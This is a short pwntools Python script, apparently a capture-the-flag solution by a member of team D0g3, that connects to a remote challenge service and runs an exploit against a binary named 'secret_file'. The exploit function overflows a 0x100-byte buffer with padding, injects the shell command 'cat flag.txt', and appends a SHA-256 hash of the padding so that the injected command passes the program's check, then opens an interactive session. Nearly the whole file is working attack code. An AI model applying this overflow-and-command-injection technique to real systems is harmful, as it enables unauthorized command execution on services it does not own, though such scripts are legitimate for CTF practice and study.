#!/usr/bin/env python
#-*- coding:utf-8 -*-

# Author: I0gan
# Team  : D0g3

from pwn import *
import hashlib
#from LibcSearcher import LibcSearcher

#context.log_level='debug'
#context.terminal = ['konsole', '-x', 'bash', 'c']
#context.terminal = 'konsole'
#context(arch = 'i386', os = 'linux', log_level='debug')
#context(arch = 'amd64', os = 'linux', log_level='debug')

exeFile  = "secret_file"
libFile  = ""

remoteIp = "111.198.29.45"
remotePort = 45660

LOCAL = 0
LIBC  = 0

r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
pd32  = lambda x : p32(x).decode() #python3 not surport str + bytes
pd64  = lambda x : p64(x).decode()
li    = lambda x : log.info(x)
db    = lambda   : gdb.attach(io)

#--------------------------Func-----------------------------


#--------------------------Exploit--------------------------
def exploit():
	p = 'A' * 0x100
	p += 'cat flag.txt'.ljust(0x1F8  - 0x1DD, ' ') + hashlib.sha256(p).hexdigest()
	sl(p)
	
def finish():
	ia()
	c()

#--------------------------Main-----------------------------
if __name__ == '__main__':
	
	if LOCAL:
		exe = ELF(exeFile)
		if LIBC:
			libc = ELF(libFile)
		io = exe.process(env = {"LD_PRELOAD" : libFile})
	
	else:
		exe = ELF(exeFile)
		io = remote(remoteIp, remotePort)
		if LIBC:
			libc = ELF(libFile)
	
	exploit()
	finish()
    
